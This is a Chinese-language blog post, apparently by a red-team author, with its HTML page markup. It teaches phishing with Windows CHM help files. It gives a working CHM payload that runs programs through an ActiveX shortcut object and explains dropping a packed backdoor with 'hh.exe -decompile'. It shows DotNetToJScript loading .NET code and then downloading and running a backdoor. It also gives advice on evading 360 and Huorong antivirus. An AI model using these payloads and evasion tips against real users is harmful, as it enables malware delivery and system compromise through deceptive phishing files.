@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>使用CHM文件进行钓鱼</title>
+</head>
+<body>
+  <header class="texture-black">
+    <div class="container"><div class="navbar">
+	<ul>
+		<a href="/index"><li>Home</li></a>
+		<a href="/about"><li>About</li></a>
+		<a href="/archive"><li>Archive</li></a>
+	</ul>
+</div></div><div class="container">
+	<h1>使用CHM文件进行钓鱼</h1>
+	<h4 class="post-description"></h4>
+	<div class="post-date" style="margin-top:20px">
+		Published on Jan 30, 2020
+	</div>
+	<ul class="post-tags"><li>apt</li></ul>
+</div>
+</header>
+  <main>
+    <div class="container">
+      <div class="post-container">
+          <p>进行钓鱼选择合适的payload非常重要，使用一些容易让人放松警惕的文件格式可以大大提高钓鱼的成功率。CHM是微软推出的基于HTML的帮助文件系统，被 IE 浏览器支持的JavaScript, VBScript, ActiveX,等，CHM同样支持。因此使用CHM作为钓鱼的payload非常合适。本文总结了两种基于CHM执行命令的方式。</p>
+
+<h1 id="使用com控件命令执行">使用com控件命令执行</h1>
+
+<p>根据@ithurricanept的twitter</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20200130165102.png" alt="" /></p>
+
+<p><a href="https://twitter.com/ithurricanept/status/534993743196090368">https://twitter.com/ithurricanept/status/534993743196090368</a></p>
+
+<p>使用了js调用com控件执行命令</p>
+
+<p>源码如下：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span><span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Mousejack replay<span class="nt">&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span>
+command exec 
+<span class="nt">&lt;OBJECT</span> <span class="na">id=</span><span class="s">x</span> <span class="na">classid=</span><span class="s">"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"</span> <span class="na">width=</span><span class="s">1</span> <span class="na">height=</span><span class="s">1</span><span class="nt">&gt;</span>
+<span class="nt">&lt;PARAM</span> <span class="na">name=</span><span class="s">"Command"</span> <span class="na">value=</span><span class="s">"ShortCut"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;PARAM</span> <span class="na">name=</span><span class="s">"Button"</span> <span class="na">value=</span><span class="s">"Bitmap::shortcut"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;PARAM</span> <span class="na">name=</span><span class="s">"Item1"</span> <span class="na">value=</span><span class="s">',calc.exe'</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;PARAM</span> <span class="na">name=</span><span class="s">"Item2"</span> <span class="na">value=</span><span class="s">"273,1,1"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/OBJECT&gt;</span>
+<span class="nt">&lt;SCRIPT&gt;</span>
+x.Click();
+<span class="nt">&lt;/SCRIPT&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h2 id="poc">POC</h2>
+
+<p>使用HTML Help Workshop</p>
+
+<p><a href="http://microsoft.com/en-us/download/details.aspx?id=21138">http://microsoft.com/en-us/download/details.aspx?id=21138</a></p>
+
+<p>创建一个新的project，添加文件后进行编译</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/1580212823088.png" alt="" /></p>
+
+<p>测试：</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/1580212859994.png" alt="" /></p>
+
+<h2 id="利用">利用</h2>
+
+<p>实际测试的时候注意到了以下几点：</p>
+
+<ul>
+  <li>
+    <p>执行命令的时候注意传入的参数与程序名需要用逗号隔开，参数与参数之间不需要。</p>
+  </li>
+  <li>考虑到进行敏感操作会导致杀软提示，因此尽量避免使用powershell、bitsadmin、certutil、cscript等。</li>
+  <li>通过cmd执行命令也属于敏感操作，因此使用多个控件依次执行命令。</li>
+</ul>
+
+<p>在搜索的过程中发现.chm文件的默认程序hh.exe具有decompile的功能，可以将打包进chm的文件释放出来</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HH.EXE -decompile D:/xTemp/decompile-folder C:/xTemp/XMLconvert.chm
+</code></pre></div></div>
+
+<p>因此可以将后门程序一起打包进chm文件中，运行时调用hh.exe释放chm中的后门程序再执行。</p>
+
+<p>测试：</p>
+
+<p>使用360测试的时候效果不太理想，在联网情况下使用hh.exe decompile会被拦截，断网情况下没有问题。</p>
+
+<p>使用火绒测试没有任何拦截。</p>
+
+<h1 id="使用js加载net">使用js加载.net</h1>
+
+<p>既然可以利用chm执行js，那为什么不内嵌.net和dll呢？</p>
+
+<p><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p>
+
+<h2 id="poc-1">POC</h2>
+
+<p>编写一个.net dll</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">ClassLibrary1</span>
+<span class="p">{</span>
+
+    <span class="k">public</span> <span class="k">class</span> <span class="nc">Class1</span>
+    <span class="p">{</span>
+        <span class="k">public</span> <span class="nf">Class1</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="cm">/* Start notepad */</span>
+			<span class="n">Process</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>生成js脚本</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DotNetToJScript.exe -o 1.js ClassLibrary1.dll -c ClassLibrary1.Class1
+</code></pre></div></div>
+
+<p>执行js脚本</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/1580376712378.png" alt="" /></p>
+
+<h2 id="利用-1">利用</h2>
+
+<p>本来想直接加载shellcode上线，但是有问题，因为对.net不了解所以只能放弃了。。。</p>
+
+<p>最后还是下载后门程序然后执行</p>
+
+<p>测试：</p>
+
+<p>美中不足的是加载使用js加载.net会有启用activeX控件的警告，必须点“是”之后才能加载。</p>
+
+<p>360火绒均不拦截</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20200130173719.png" alt="" /></p>
+
+      </div>
+
+        <!-- Configure Disqus --></div>
+  </main></body>
+</html>
